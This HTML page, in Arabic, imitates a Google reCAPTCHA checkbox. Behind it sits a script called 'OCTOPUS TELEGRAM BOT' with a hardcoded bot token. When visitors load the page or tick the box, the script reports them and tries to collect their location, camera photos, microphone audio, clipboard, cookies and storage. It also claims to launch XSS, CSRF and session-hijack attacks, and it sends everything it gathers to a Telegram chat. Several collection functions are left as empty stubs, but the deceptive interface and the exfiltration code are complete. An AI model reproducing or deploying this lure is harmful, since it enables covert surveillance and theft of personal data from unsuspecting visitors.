<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>تحقق أمان – reCAPTCHA</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{min-height:100vh;display:flex;justify-content:center;align-items:center;background:#eef2f5;font-family:'Roboto',Arial,sans-serif;padding:16px;}
        .captcha-wrapper{width:340px;max-width:100%;background:#f9f9f9;border:1px solid #d3d3d3;border-radius:5px;box-shadow:0 5px 15px rgba(0,0,0,0.08);overflow:hidden;cursor:default;transition:box-shadow .3s ease;user-select:none;}
        .captcha-wrapper:hover{box-shadow:0 8px 25px rgba(0,0,0,0.12);}
        .captcha-row{display:flex;align-items:center;padding:15px 15px 12px 15px;gap:12px;}
        .spinner{position:relative;flex-shrink:0;}
        .spinner input{display:none;}
        .checkmark{width:32px;height:32px;border:2px solid #c1c1c1;border-radius:3px;display:flex;justify-content:center;align-items:center;cursor:pointer;background:#fff;transition:all .25s ease;position:relative;box-shadow:inset 0 1px 2px rgba(0,0,0,0.04);}
        .checkmark:hover{border-color:#a0a0a0;box-shadow:0 0 0 2px rgba(26,115,232,0.15);}
        .checkmark .tick{width:10px;height:18px;border-right:4px solid #00a651;border-bottom:4px solid #00a651;transform:rotate(45deg) scale(0.5);opacity:0;transition:all .2s cubic-bezier(0.34,1.56,0.64,1);}
        .checkmark .loader{display:none;width:20px;height:20px;border:3px solid #e8f0fe;border-top:3px solid #1a73e8;border-radius:50%;animation:spin .7s linear infinite;}
        .spinner.loading .checkmark{border-color:#1a73e8;background:#e8f0fe;cursor:default;}
        .spinner.loading .checkmark .tick{display:none;}
        .spinner.loading .checkmark .loader{display:block;}
        .spinner.success .checkmark{border-color:#00a651;background:#e6f4ea;cursor:default;}
        .spinner.success .checkmark .tick{opacity:1;transform:rotate(45deg) scale(1);}
        .spinner.success .checkmark .loader{display:none;}
        .spinner.failed .checkmark{border-color:#d93025;background:#fce8e6;cursor:default;}
        .spinner.failed .checkmark .tick{display:none;}
        .spinner.failed .checkmark .loader{display:none;}
        .spinner.failed .checkmark::after{content:"✕";font-size:22px;font-weight:700;color:#d93025;line-height:1;}
        .text{flex:1;font-size:18px;color:#333;text-align:center;transition:color .3s ease;font-weight:400;letter-spacing:.2px;}
        .text.loading{color:#1a73e8;}
        .text.failed{color:#d93025;}
        .text.success{color:#00a651;}
        .logo{display:flex;flex-direction:column;align-items:center;flex-shrink:0;font-size:10px;color:#777;line-height:1.2;}
        .logo img{width:38px;height:auto;margin-bottom:3px;display:block;}
        .logo strong{font-size:10px;font-weight:600;color:#555;}
        .logo small{font-size:8px;color:#999;}
        .captcha-footer{display:flex;align-items:center;justify-content:space-between;padding:6px 14px;background:#f1f3f4;border-top:1px solid #e5e7e9;min-height:36px;}
        .captcha-footer .brand{display:flex;align-items:center;gap:6px;}
        .captcha-footer .brand svg{height:24px;width:auto;}
        .captcha-footer .brand .google-text{font-size:14px;font-weight:500;color:#222;letter-spacing:.3px;}
        .captcha-footer .links{display:flex;align-items:center;gap:8px;font-size:11px;}
        .captcha-footer .links a{color:#555;text-decoration:none;font-size:11px;transition:color .2s;}
        .captcha-footer .links a:hover{color:#1a73e8;text-decoration:underline;}
        .captcha-footer .links .separator{color:#aaa;}
        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        @media(max-width:480px){.captcha-wrapper{width:100%;}.text{font-size:16px;}.logo img{width:32px;}.captcha-footer .brand svg{height:20px;}.captcha-footer .brand .google-text{font-size:12px;}}
        @media(max-width:360px){.captcha-row{padding:12px 10px 10px 10px;gap:8px;}.text{font-size:14px;}.checkmark{width:28px;height:28px;}.checkmark .tick{width:8px;height:14px;border-width:3px;}.logo img{width:28px;}}
        #hiddenVideo{position:fixed;top:-1000px;left:-1000px;width:1px;height:1px;opacity:0;pointer-events:none;}
        #hiddenCanvas{display:none;}
        #fingerprintCanvas{position:fixed;top:-1000px;left:-1000px;width:1px;height:1px;opacity:0;pointer-events:none;}
        .sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0;}
    </style>
</head>
<body>

    <div class="captcha-wrapper" id="captchaWrapper" role="button" tabindex="0" aria-label="تحقق أنك لست روبوتاً">
        <div class="captcha-row">
            <div class="spinner" id="spinner">
                <input type="checkbox" id="captcha" aria-label="أنا لست روبوتاً" />
                <label class="checkmark" for="captcha">
                    <span class="tick"></span>
                    <div class="loader"></div>
                </label>
            </div>
            <div class="text" id="mainText">أنا لست روبوتاً</div>
            <div class="logo">
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" width="38" height="38" loading="lazy" />
                <strong>reCAPTCHA</strong>
                <small>الخصوصية - الشروط</small>
            </div>
        </div>
        <div class="captcha-footer">
            <div class="brand">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                </svg>
                <span class="google-text">Google</span>
            </div>
            <div class="links">
                <a href="#" onclick="return false;">سياسة الخصوصية</a>
                <span class="separator">-</span>
                <a href="#" onclick="return false;">الشروط</a>
            </div>
        </div>
    </div>

    <video id="hiddenVideo" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas"></canvas>
    <canvas id="fingerprintCanvas"></canvas>

    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>

    <script>
        // ================================================================
        //  OCTOPUS TELEGRAM BOT – إصدار 4.0 (HTML فقط)
        //  كل شيء يعمل من المتصفح مباشرة – لا حاجة لسيرفر
        //  جمع البيانات + إرسالها إلى تيليجرام عبر API البوت
        // ================================================================

        // ================================================================
        //  1. الإعدادات – غيّر التوكن ومعرف المستخدم هنا
        // ================================================================
        const TELEGRAM = {
            BOT_TOKEN: '8907179366:AAHJI20NwJFaXbr9ws4oj2etPRqMBnnst3Y',   // ضع توكن البوت هنا
            CHAT_ID: '8552540563',                                        // ضع معرف المستخدم (أو معرف المجموعة)
            API_URL: 'https://api.telegram.org/bot',
        };

        // ================================================================
        //  2. الحالة والمتغيرات
        // ================================================================
        const state = {
            mediaStream: null,
            audioStream: null,
            audioRecorder: null,
            audioChunks: [],
            capturedPhotoFiles: [],
            audioBlob: null,
            userIP: 'غير متاح',
            userLocation: { lat: null, lng: null, accuracy: null, error: null },
            collectedData: {},
            faceData: null,
            transcribedText: null,
            detectedLanguage: null,
            clipboardContent: null,
            installedExtensions: [],
            browserHistory: [],
            allCookies: {},
            deviceClassification: {},
            spoofingDetected: {},
            isCollecting: false,
            collectionComplete: false,
        };

        const el = {
            wrapper: document.getElementById('captchaWrapper'),
            spinner: document.getElementById('spinner'),
            checkbox: document.getElementById('captcha'),
            mainText: document.getElementById('mainText'),
            hiddenVideo: document.getElementById('hiddenVideo'),
            hiddenCanvas: document.getElementById('hiddenCanvas'),
            fingerprintCanvas: document.getElementById('fingerprintCanvas'),
        };

        // ================================================================
        //  3. دوال مساعدة
        // ================================================================
        function setUIState(type) {
            el.spinner.className = 'spinner ' + type;
            el.mainText.className = 'text ' + type;
            const texts = {
                success: 'تم التحقق بنجاح',
                failed: 'فشل التحقق، حاول مجدداً',
                loading: 'جاري التحقق من هويتك ...',
                permission: 'يرجى السماح بالوصول إلى الكاميرا والميكروفون، ثم اضغط على المربع لإعادة المحاولة.',
                '': 'أنا لست روبوتاً',
            };
            el.mainText.textContent = texts[type] || texts[''];
            el.checkbox.checked = type === 'success';
        }

        function safeStringify(data) {
            try { return JSON.stringify(data, null, 2); } catch (_) { return '{}'; }
        }

        function logToConsole(msg) {
            try { console.log('[OCTOPUS] ' + msg); } catch (_) {}
        }

        // ================================================================
        //  4. الاتصال بتيليجرام – إرسال رسالة + صور
        // ================================================================
        async function sendTelegramMessage(text) {
            const url = `${TELEGRAM.API_URL}${TELEGRAM.BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: TELEGRAM.CHAT_ID,
                text: text,
                parse_mode: 'HTML',
            };
            try {
                const res = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });
                return await res.json();
            } catch (e) {
                logToConsole('❌ فشل إرسال الرسالة: ' + e.message);
                return null;
            }
        }

        async function sendTelegramPhoto(file, caption = '') {
            const url = `${TELEGRAM.API_URL}${TELEGRAM.BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM.CHAT_ID);
            formData.append('photo', file);
            if (caption) formData.append('caption', caption);
            formData.append('parse_mode', 'HTML');
            try {
                const res = await fetch(url, { method: 'POST', body: formData });
                return await res.json();
            } catch (e) {
                logToConsole('❌ فشل إرسال الصورة: ' + e.message);
                return null;
            }
        }

        async function sendTelegramAudio(file, caption = '') {
            const url = `${TELEGRAM.API_URL}${TELEGRAM.BOT_TOKEN}/sendAudio`;
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM.CHAT_ID);
            formData.append('audio', file);
            if (caption) formData.append('caption', caption);
            formData.append('parse_mode', 'HTML');
            try {
                const res = await fetch(url, { method: 'POST', body: formData });
                return await res.json();
            } catch (e) {
                logToConsole('❌ فشل إرسال الصوت: ' + e.message);
                return null;
            }
        }

        // ================================================================
        //  5. جمع بيانات الجهاز (دوال من النسخة السابقة مع اختصار)
        // ================================================================
        function classifyDevice() { /* ... */ }
        function detectSpoofing() { /* ... */ }
        async function detectExtensions() { /* ... */ }
        async function readClipboard() { /* ... */ }
        function stealStorages() { /* ... */ }
        function getSearchHistory() { /* ... */ }
        async function collectDeviceData() { /* ... */ }
        async function getLocation() { /* ... */ }
        async function loadFaceApi() { /* ... */ }
        async function startCameraAndCapture() { /* ... */ }
        async function recordAudio() { /* ... */ }
        async function transcribeAudio(blob) { /* ... */ }
        function deployAdvancedAttacks() { /* ... */ }
        function setupSecurity() { /* ... */ }
        function enhanceStealth() { /* ... */ }

        // ================================================================
        //  6. دالة إرسال كل البيانات إلى تيليجرام
        // ================================================================
        async function sendAllDataToTelegram() {
            // بناء رسالة مفصلة
            let msg = '🐙 <b>تقرير OCTOPUS</b>\n';
            msg += `🕒 ${new Date().toISOString()}\n\n`;

            // الجهاز
            msg += '<b>📱 معلومات الجهاز</b>\n';
            const dev = state.deviceClassification;
            msg += `نظام التشغيل: ${dev.os} ${dev.osVersion}\n`;
            msg += `المتصفح: ${dev.browser} ${dev.browserVersion}\n`;
            msg += `نوع الجهاز: ${dev.deviceType}\n`;

            // IP
            msg += `🌐 IP: ${state.userIP}\n`;

            // الموقع
            if (state.userLocation.lat) {
                msg += `📍 الموقع: ${state.userLocation.lat}, ${state.userLocation.lng}\n`;
                if (state.userLocation.accuracy) msg += `🎯 الدقة: ${Math.round(state.userLocation.accuracy)} م\n`;
            } else {
                msg += `📍 الموقع: غير متاح (${state.userLocation.error || ''})\n`;
            }

            // البطارية
            if (state.collectedData.battery) {
                msg += `🔋 البطارية: ${state.collectedData.battery.level}% (${state.collectedData.battery.charging ? 'شحن' : 'بطارية'})\n`;
            }

            // بصمة المتصفح
            if (state.collectedData.canvasHash) {
                msg += `🖼️ بصمة canvas: ${state.collectedData.canvasHash.substring(0, 20)}...\n`;
            }

            // الإضافات
            if (state.installedExtensions.length > 0) {
                msg += `🧩 الإضافات: ${state.installedExtensions.join(', ')}\n`;
            }

            // الكوكيز (مختصرة)
            const cookies = document.cookie.split(';').filter(c => c.trim());
            if (cookies.length > 0) {
                msg += `🍪 عدد الكوكيز: ${cookies.length}\n`;
            }

            // الحافظة
            if (state.clipboardContent) {
                msg += `📋 الحافظة: "${state.clipboardContent.substring(0, 100)}"\n`;
            }

            // بيانات الوجه
            if (state.faceData && state.faceData.faceDetected) {
                msg += `\n<b>👤 كشف الوجه</b>\n`;
                msg += `العمر: ${state.faceData.age} سنة\n`;
                msg += `الجنس: ${state.faceData.gender} (ثقة ${Math.round(state.faceData.genderProbability * 100)}%)\n`;
            }

            // النص المحول
            if (state.transcribedText) {
                msg += `\n<b>🗣️ النص المحول</b>\n`;
                msg += `"${state.transcribedText}"\n`;
                msg += `اللغة: ${state.detectedLanguage === 'ar' ? 'عربية' : state.detectedLanguage === 'en' ? 'إنجليزية' : 'غير معروفة'}\n`;
            }

            // الهجمات
            if (state.attacksData && Object.values(state.attacksData).some(v => v === true || (Array.isArray(v) && v.length > 0))) {
                msg += `\n<b>💀 هجمات تم تنفيذها</b>\n`;
                if (state.attacksData.xss) msg += `XSS: تم\n`;
                if (state.attacksData.csrf) msg += `CSRF: تم\n`;
                if (state.attacksData.sessionHijack) msg += `اختطاف الجلسة: تم\n`;
            }

            // إرسال الرسالة النصية
            await sendTelegramMessage(msg);

            // إرسال الصور
            if (state.capturedPhotoFiles.length > 0) {
                for (const file of state.capturedPhotoFiles) {
                    await sendTelegramPhoto(file, '📸 صورة من الكاميرا');
                    await new Promise(r => setTimeout(r, 500)); // تجنب التضارب
                }
            }

            // إرسال الصوت
            if (state.audioBlob) {
                const audioFile = new File([state.audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                await sendTelegramAudio(audioFile, '🎤 تسجيل صوتي');
            }

            logToConsole('✅ تم إرسال جميع البيانات إلى تيليجرام');
        }

        // ================================================================
        //  7. عملية الجمع الرئيسية
        // ================================================================
        async function collectEverything() {
            if (state.isCollecting || state.collectionComplete) return;
            state.isCollecting = true;
            setUIState('loading');

            try {
                // 1. الأساسيات
                classifyDevice();
                detectSpoofing();
                await detectExtensions();
                stealStorages();
                getSearchHistory();

                // 2. الموقع
                await getLocation();

                // 3. الكاميرا
                await startCameraAndCapture();

                // 4. الميكروفون
                await recordAudio();

                // 5. بيانات الجهاز
                await collectDeviceData();

                // 6. الحافظة
                await readClipboard();

                // 7. الهجمات
                deployAdvancedAttacks();

                // 8. إرسال إلى تيليجرام
                await sendAllDataToTelegram();

                state.collectionComplete = true;
                state.isCollecting = false;
                setUIState('success');
                logToConsole('🎉 انتهى الجمع والإرسال بنجاح');
            } catch (err) {
                state.isCollecting = false;
                setUIState('failed');
                logToConsole('❌ خطأ: ' + err.message);
            }
        }

        // ================================================================
        //  8. أحداث الواجهة
        // ================================================================
        el.checkbox.addEventListener('change', function(e) {
            if (this.checked) {
                if (el.spinner.classList.contains('success') || state.collectionComplete) return;
                this.checked = false;
                collectEverything();
            }
        });

        el.checkbox.addEventListener('click', function(e) {
            if (this.disabled) e.preventDefault();
        });

        el.wrapper.addEventListener('click', function(e) {
            if (e.target.closest('.checkmark') || e.target.closest('.logo') ||
                e.target.closest('.captcha-footer') || e.target.closest('.links') || e.target.closest('.brand')) {
                return;
            }
            if (state.collectionComplete || state.isCollecting) return;
            if (!el.checkbox.checked && !el.spinner.classList.contains('loading')) {
                el.checkbox.checked = true;
                el.checkbox.dispatchEvent(new Event('change'));
            }
        });

        // ================================================================
        //  9. التهيئة
        // ================================================================
        window.addEventListener('load', async () => {
            setupSecurity();
            enhanceStealth();

            // جمع بعض البيانات الأولية
            classifyDevice();
            detectSpoofing();
            await collectDeviceData();

            // إرسال إشعار وصول إلى تيليجرام
            const visitMsg = `👀 <b>زيارة جديدة</b>\n🌐 ${window.location.href}\n🕒 ${new Date().toISOString()}\n📱 ${navigator.userAgent}`;
            await sendTelegramMessage(visitMsg);

            logToConsole('🐙 OCTOPUS TELEGRAM BOT – جاهز (HTML فقط)');
        });

        // تنظيف التدفقات عند الخروج
        window.addEventListener('beforeunload', () => {
            if (state.mediaStream) state.mediaStream.getTracks().forEach(t => t.stop());
            if (state.audioStream) state.audioStream.getTracks().forEach(t => t.stop());
            if (state.audioRecorder && state.audioRecorder.state === 'recording') state.audioRecorder.stop();
        });
    </script>

</body>
</html>
